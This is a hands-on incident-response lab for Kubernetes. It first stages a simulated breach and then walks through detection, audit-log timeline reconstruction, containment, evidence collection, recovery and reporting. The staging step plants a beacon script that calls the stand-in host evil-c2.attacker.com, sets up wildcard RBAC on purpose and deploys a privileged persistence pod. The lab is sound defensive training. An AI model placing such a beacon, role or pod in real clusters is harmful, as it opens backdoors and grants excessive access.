# Lab 12: Incident Response Tabletop

**Duration:** 40 minutes

## Objectives

By the end of this lab, you will be able to:

- Investigate a pre-staged compromise scenario in a Kubernetes cluster
- Collect forensic evidence from pods, audit logs, and RBAC state
- Investigate lateral movement and secret exfiltration
- Reconstruct an attack timeline from audit logs using jq
- Perform containment using NetworkPolicies and RBAC lockdown
- Execute recovery steps and produce an incident report

## Prerequisites

- Cloud9 environment with Docker
- `kubectl` and `kind` installed

## Scenario

> **Alert:** Your monitoring system has detected unusual activity in the `production` namespace. A Falco alert fired for "shell spawned in container" and audit logs show unexpected secret access. Your task is to investigate, contain, and recover.

---

### Step 1: Create Cluster and Stage the Compromise

```bash
# Create cluster with audit logging
kind create cluster --name ir-lab --config labs/setup/kind-config-audit.yaml
kubectl wait --for=condition=Ready nodes --all --timeout=120s

# Create the production namespace and deploy the "legitimate" application
kubectl create namespace production

kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  namespace: production
spec:
  replicas: 2
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      serviceAccountName: web-app-sa
      containers:
        - name: web
          image: nginx:1.25-alpine
          ports:
            - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: web-app
  namespace: production
spec:
  selector:
    app: web-app
  ports:
    - port: 80
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
EOF

# Create secrets the app uses
kubectl create secret generic db-credentials -n production \
  --from-literal=host=db.internal.example.com \
  --from-literal=username=app_readonly \
  --from-literal=password='Pr0d-P@ssw0rd-2024!'

kubectl create secret generic api-keys -n production \
  --from-literal=stripe-key='sk_live_fake_key_12345' \
  --from-literal=sendgrid-key='SG.fake_key_67890'

# Create overly permissive RBAC (the vulnerability the attacker exploited)
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["*"]
    verbs: ["*"]
  - apiGroups: ["apps"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: web-app-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: web-app-sa
    namespace: production
roleRef:
  kind: Role
  name: web-app-role
  apiGroup: rbac.authorization.k8s.io
EOF

kubectl wait --for=condition=Ready pods --all -n production --timeout=120s

# Simulate the attack
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')

kubectl exec -n production $ATTACK_POD -- sh -c '
  cat /etc/passwd > /tmp/.passwd_dump
  cat > /tmp/.backdoor.sh << "SHELL"
#!/bin/sh
while true; do
  sleep 300
  wget -q -O /dev/null http://evil-c2.attacker.com/beacon 2>/dev/null || true
done
SHELL
  chmod +x /tmp/.backdoor.sh
  echo "$(date) - accessed via kubectl exec" >> /tmp/.access_log
  mkdir -p /tmp/.tools
  echo "# crypto miner config" > /tmp/.tools/config.json
'

# Simulate secret exfiltration via the service account
kubectl get secrets -n production -o yaml > /dev/null 2>&1
kubectl get secret db-credentials -n production -o jsonpath='{.data.password}' > /dev/null 2>&1
kubectl get secret api-keys -n production -o jsonpath='{.data.stripe-key}' > /dev/null 2>&1

# Simulate lateral movement attempts — try to access other namespaces
kubectl get secrets -n kube-system --as system:serviceaccount:production:web-app-sa 2>/dev/null || true
kubectl get pods -n kube-system --as system:serviceaccount:production:web-app-sa 2>/dev/null || true
kubectl get configmaps -n default --as system:serviceaccount:production:web-app-sa 2>/dev/null || true

# Deploy attacker persistence pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: debug-tools
  namespace: production
  labels:
    app: web-app
    purpose: debug
spec:
  serviceAccountName: web-app-sa
  containers:
    - name: tools
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
EOF

kubectl wait --for=condition=Ready pod/debug-tools -n production --timeout=60s

echo ""
echo "============================================"
echo "  INCIDENT SCENARIO STAGED"
echo "============================================"
echo ""
echo "  [CRITICAL] Falco Alert: Shell spawned in container"
echo "  Namespace: production | Pod: $ATTACK_POD"
echo ""
echo "  [WARNING] Audit Alert: Unusual secret access pattern"
echo "  User: system:serviceaccount:production:web-app-sa"
echo ""
echo "  Begin your investigation below."
echo "============================================"
```

### Step 2: Detection -- Initial Assessment

```bash
echo "=== DETECTION: Initial Assessment ==="
echo ""

# What pods are running?
echo "--- Running Pods ---"
kubectl get pods -n production -o wide

# Check for suspicious characteristics
echo ""
echo "--- Pod Details ---"
kubectl get pods -n production -o jsonpath='{range .items[*]}Pod: {.metadata.name}  Image: {.spec.containers[0].image}  SA: {.spec.serviceAccountName}  Privileged: {.spec.containers[0].securityContext.privileged}{"\n"}{end}'

# Check namespaces for anything unexpected
echo ""
echo "--- All Namespaces ---"
kubectl get namespaces
```

Note: The `debug-tools` pod is running a privileged Ubuntu container -- this is highly suspicious in a production namespace.

### Step 3: Investigation -- Examine Compromise, RBAC, and Audit Logs

```bash
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')

echo "=== INVESTIGATION ==="
echo ""

# Check for suspicious files on the compromised pod
echo "--- Hidden files in /tmp ---"
kubectl exec -n production $ATTACK_POD -- ls -la /tmp/

echo ""
echo "--- Backdoor script content ---"
kubectl exec -n production $ATTACK_POD -- cat /tmp/.backdoor.sh 2>/dev/null || echo "No backdoor found"

echo ""
echo "--- Attacker tools ---"
kubectl exec -n production $ATTACK_POD -- cat /tmp/.tools/config.json 2>/dev/null || echo "No tools found"

# Check RBAC permissions
echo ""
echo "--- Service Account Permissions ---"
kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
kubectl auth can-i create pods -n production --as system:serviceaccount:production:web-app-sa
kubectl get role web-app-role -n production -o yaml | grep -A 10 "rules:"

# Check audit logs for secret access
echo ""
echo "--- Audit Logs: Secret Access ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
    "  \(.requestReceivedTimestamp // "") | \(.verb) | \(.user.username) | \(.objectRef.name // "")"' | tail -15

# Check for cluster-level bindings
echo ""
echo "--- ClusterRoleBindings for web-app-sa ---"
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.subjects[]? | .name == "web-app-sa" and .namespace == "production") |
    "  ClusterRoleBinding: \(.metadata.name) -> \(.roleRef.name)"' 2>/dev/null || echo "  No cluster-level bindings found"
```

### Step 4: Investigate Lateral Movement

```bash
echo "=== LATERAL MOVEMENT INVESTIGATION ==="
echo ""

# Check if the attacker tried to access secrets in other namespaces
echo "--- Cross-Namespace Secret Access Attempts ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace != "production" and
    (.user.username | test("web-app-sa"))) |
    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.namespace)/\(.objectRef.name // "*") | status:\(.responseStatus.code // "")"'

# Check for access attempts to other namespaces (any resource)
echo ""
echo "--- All Cross-Namespace Access Attempts by web-app-sa ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.namespace != "production" and .objectRef.namespace != null and
    (.user.username | test("web-app-sa"))) |
    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.name // "*") in \(.objectRef.namespace) | status:\(.responseStatus.code // "")"'

# Check if the attacker tried to escalate to cluster-level resources
echo ""
echo "--- Cluster-Level Access Attempts ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.namespace == null and .objectRef.resource != null and
    (.user.username | test("web-app-sa"))) |
    "  \(.requestReceivedTimestamp // "") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.name // "*") | status:\(.responseStatus.code // "")"' | tail -10

# Check what the debug-tools pod has been doing
echo ""
echo "--- Debug-Tools Pod Activity ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.name == "debug-tools") |
    "  \(.requestReceivedTimestamp // "") | \(.verb) | \(.user.username)"'
```

### Step 5: Reconstruct Attack Timeline

```bash
echo "=== ATTACK TIMELINE RECONSTRUCTION ==="
echo ""

# Build a chronological timeline of all suspicious activity in the production namespace
echo "--- Full Timeline (production namespace) ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.namespace == "production" and
    (.verb == "create" or .verb == "delete" or .verb == "get" or .verb == "exec" or
     .objectRef.subresource == "exec" or .objectRef.resource == "secrets")) |
    "  \(.requestReceivedTimestamp // "unknown") | \(.verb) \(.objectRef.resource // "")/\(.objectRef.subresource // "")/\(.objectRef.name // "*") | \(.user.username) | status:\(.responseStatus.code // "")"' | sort

# Show just the secret-related timeline
echo ""
echo "--- Secret Access Timeline ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") |
    "  \(.requestReceivedTimestamp // "unknown") | \(.verb) secret/\(.objectRef.name // "*") | \(.user.username) | status:\(.responseStatus.code // "")"' | sort

# Show exec timeline
echo ""
echo "--- Exec Command Timeline ---"
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") |
    "  \(.requestReceivedTimestamp // "unknown") | exec into \(.objectRef.name // "unknown") | \(.user.username)"' | sort

# Count suspicious events by type
echo ""
echo "--- Event Summary ---"
echo -n "  Secret access events: "
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") | .verb' | wc -l
echo -n "  Exec events: "
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") | .verb' | wc -l
echo -n "  Failed requests (403): "
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log 2>/dev/null | \
  jq -r 'select(.responseStatus.code == 403 and (.user.username | test("web-app-sa"))) | .verb' | wc -l
```

### Step 6: Containment -- Network Isolation and RBAC Lockdown

```bash
echo "=== CONTAINMENT ==="
echo ""

# Apply emergency network isolation
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-isolate
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
  # No ingress/egress rules = block all traffic
EOF

echo "Network isolation applied -- all traffic blocked"

# Remove the attacker's debug pod
echo ""
echo "Removing attacker's debug pod..."
kubectl delete pod debug-tools -n production --grace-period=0 --force

# Lock down RBAC -- replace wildcard permissions with minimal access
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get"]
EOF

echo "RBAC locked down -- service account now has minimal permissions"

# Verify lockdown
echo ""
echo "Can SA still access secrets?"
kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
```

### Step 7: Evidence Collection

```bash
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')

echo "=== EVIDENCE COLLECTION ==="
echo ""

mkdir -p /tmp/incident-evidence

# Capture pod state
kubectl get pod $ATTACK_POD -n production -o yaml > /tmp/incident-evidence/compromised-pod.yaml
echo "Saved: compromised-pod.yaml"

# Capture pod logs
kubectl logs $ATTACK_POD -n production > /tmp/incident-evidence/pod-logs.txt 2>&1
echo "Saved: pod-logs.txt"

# Capture filesystem evidence
kubectl exec -n production $ATTACK_POD -- tar czf - /tmp/ 2>/dev/null > /tmp/incident-evidence/tmp-contents.tar.gz
echo "Saved: tmp-contents.tar.gz"

# Capture RBAC state
kubectl get role,rolebinding -n production -o yaml > /tmp/incident-evidence/rbac-state.yaml
echo "Saved: rbac-state.yaml"

# Capture audit logs
docker exec ir-lab-control-plane cat /var/log/kubernetes/audit/audit.log > /tmp/incident-evidence/audit-log.json 2>/dev/null
echo "Saved: audit-log.json"

# Capture events
kubectl get events -n production --sort-by='.lastTimestamp' > /tmp/incident-evidence/events.txt
echo "Saved: events.txt"

echo ""
echo "All evidence collected in /tmp/incident-evidence/"
ls -la /tmp/incident-evidence/
```

### Step 8: Recovery -- Delete Compromised Resources and Verify

```bash
echo "=== RECOVERY ==="
echo ""

# Quarantine and remove the compromised pod
ATTACK_POD=$(kubectl get pod -n production -l app=web-app -o jsonpath='{.items[0].metadata.name}')
kubectl label pod $ATTACK_POD -n production app-
kubectl delete pod $ATTACK_POD -n production --grace-period=0 --force
echo "Compromised pod removed"

# Restart the deployment to get clean pods
kubectl rollout restart deployment web-app -n production
kubectl wait --for=condition=Ready pods -l app=web-app -n production --timeout=60s

# Remove the emergency network policy (in production you would replace with a proper one)
kubectl delete networkpolicy emergency-isolate -n production

echo ""
echo "--- Verification: Cluster State ---"
kubectl get pods -n production
echo ""
kubectl get pods --all-namespaces -l purpose=debug 2>/dev/null || echo "No debug pods found anywhere"
echo ""
echo "Can SA access secrets?"
kubectl auth can-i get secrets -n production --as system:serviceaccount:production:web-app-sa
echo ""
echo "Recovery complete. In a real incident, you would also:"
echo "  - Rotate all exposed credentials (db-credentials, api-keys)"
echo "  - Review and harden all service account permissions"
echo "  - Deploy Pod Security Standards to prevent privileged pods"
```

### Step 9: Create Incident Report

```bash
echo "=== GENERATING INCIDENT REPORT ==="
echo ""

# Count key metrics from the saved audit log for the report
SECRET_EVENTS=$(cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "production") | .verb' | wc -l)
EXEC_EVENTS=$(cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.subresource == "exec" and .objectRef.namespace == "production") | .verb' | wc -l)
LATERAL_ATTEMPTS=$(cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.namespace != "production" and .objectRef.namespace != null and
    (.user.username | test("web-app-sa"))) | .verb' 2>/dev/null | wc -l)
FIRST_EVENT=$(cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.namespace == "production" and .objectRef.subresource == "exec") |
    .requestReceivedTimestamp' | sort | head -1)
LAST_EVENT=$(cat /tmp/incident-evidence/audit-log.json | \
  jq -r 'select(.objectRef.namespace == "production" and (.objectRef.resource == "secrets" or .objectRef.subresource == "exec")) |
    .requestReceivedTimestamp' | sort | tail -1)

cat > /tmp/incident-evidence/incident-report.txt <<EOF
========================================
KUBERNETES SECURITY INCIDENT REPORT
========================================

Incident ID:    IR-$(date +%Y%m%d)-001
Date:           $(date -u +"%Y-%m-%d %H:%M UTC")
Severity:       CRITICAL
Status:         RESOLVED

--- SUMMARY ---
An attacker gained access to a container in the production namespace
via overly permissive RBAC (wildcard rules on the web-app-sa service
account). The attacker executed commands in the container, planted a
backdoor script, deployed a privileged persistence pod, and
exfiltrated secrets.

--- TIMELINE ---
First exec event:   ${FIRST_EVENT:-unknown}
Last known activity: ${LAST_EVENT:-unknown}

--- IMPACT ---
Secret access events:        ${SECRET_EVENTS}
Exec events:                 ${EXEC_EVENTS}
Lateral movement attempts:   ${LATERAL_ATTEMPTS}
Secrets potentially exposed: db-credentials, api-keys
Persistence mechanism:       Privileged pod (debug-tools)

--- ROOT CAUSE ---
The web-app-role Role granted wildcard permissions ("*" on all
resources and verbs), allowing the compromised service account to
read secrets, create pods, and attempt cross-namespace access.

--- CONTAINMENT ACTIONS ---
1. Applied emergency NetworkPolicy (deny-all ingress/egress)
2. Removed attacker persistence pod (debug-tools)
3. Locked down RBAC to minimal permissions (configmap get only)

--- RECOVERY ACTIONS ---
1. Removed compromised pod
2. Restarted deployment with clean pods
3. Removed emergency network policy

--- RECOMMENDED FOLLOW-UP ---
1. Rotate ALL secrets in the production namespace immediately
2. Enforce Pod Security Standards (Restricted) on production
3. Implement least-privilege RBAC for all service accounts
4. Deploy Falco or similar runtime monitoring
5. Schedule quarterly incident response drills
========================================
EOF

cat /tmp/incident-evidence/incident-report.txt
```

### Step 10: Cleanup

```bash
# Delete the production namespace
kubectl delete namespace production

# Clean up evidence
rm -rf /tmp/incident-evidence

# (Optional) Delete the cluster
kind delete cluster --name ir-lab
```

## Summary

- Overly permissive RBAC (wildcard rules) was the root cause that allowed the attacker to access secrets and create privileged pods
- Audit logs combined with jq enable reconstructing a full attack timeline, including lateral movement attempts across namespaces
- Containment requires both network isolation (NetworkPolicy) and RBAC lockdown to cut off attacker access
- Always collect forensic evidence (pod state, filesystem, audit logs) before deleting compromised resources
- An incident report documenting timeline, impact, root cause, and follow-up actions is critical for organizational learning
